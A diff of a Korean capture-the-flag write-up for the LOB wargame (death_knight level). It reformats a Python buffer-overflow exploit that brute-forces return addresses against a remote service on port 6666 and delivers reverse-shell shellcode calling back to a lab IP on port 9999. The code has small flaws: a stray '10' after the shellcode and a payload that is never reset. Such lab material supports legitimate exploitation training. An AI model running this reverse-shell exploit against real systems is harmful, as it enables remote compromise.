@@ -94,36 +94,34 @@ main()
 [Reverse shellcode 출처](https://orang.tistory.com/entry/%ED%95%B4%EC%BB%A4%EC%8A%A4%EC%BF%A8-LOB-xavius-deathknight-by-ORANG)
 
 ```c
+import sys, struct, socket
 
-1  import sys, struct, socket
-2  
-3  host = "192.168.235.135"
-4  port = 6666
-5  
-6  hexhost = "\xc0\xa8\xeb\x8a" # 192.168.235.138
-7  recvhexport = "\x27\x0f" # port 9999
-8  
-9  shellcode = "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68" + hexhost + "\x68\x02\x00" + recvhexport + "\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"10 
-11 padding1 = "A" * 44
-12 padding2 = "\x90" * 50
-13 payload = ""
-14 
-15 for i in range(0xff, 0xf0, -1):
-16 	for j in range(0xff, 0x00, -1):
-17 		for k in range(0xff, 0x00, -1):
-18 		 	r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-19 		 	r.connect((host, port))
-20 		 	retaddr = chr(k) + chr(j) + chr(i) + "\xbf"
-21 		 	print("RET: " + str(hex(struct.unpack("I", retaddr)[0])))
-22 		 	payload += padding1
-23 		 	payload += retaddr
-24 		 	payload += padding2
-25 		 	payload += shellcode
-26 		 	print(r.recv(52))
-27 		 	print(r.recv(6))
-28 		 	r.send(payload)
-29 		 	r.close()
+host = "192.168.235.135"
+port = 6666
 
+hexhost = "\xc0\xa8\xeb\x8a" # 192.168.235.138
+recvhexport = "\x27\x0f" # port 9999
+
+shellcode = "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68" + hexhost + "\x68\x02\x00" + recvhexport + "\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"10 
+padding1 = "A" * 44
+padding2 = "\x90" * 50
+payload = ""
+
+for i in range(0xff, 0xf0, -1):
+	for j in range(0xff, 0x00, -1):
+		for k in range(0xff, 0x00, -1):
+		 	r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		 	r.connect((host, port))
+		 	retaddr = chr(k) + chr(j) + chr(i) + "\xbf"
+		 	print("RET: " + str(hex(struct.unpack("I", retaddr)[0])))
+		 	payload += padding1
+		 	payload += retaddr
+		 	payload += padding2
+		 	payload += shellcode
+		 	print(r.recv(52))
+		 	print(r.recv(6))
+		 	r.send(payload)
+		 	r.close()
 ```
 
 LOB 서버에 6666번 포트로 연결하고, receive를 9999번 포트로 받으려고 한다.
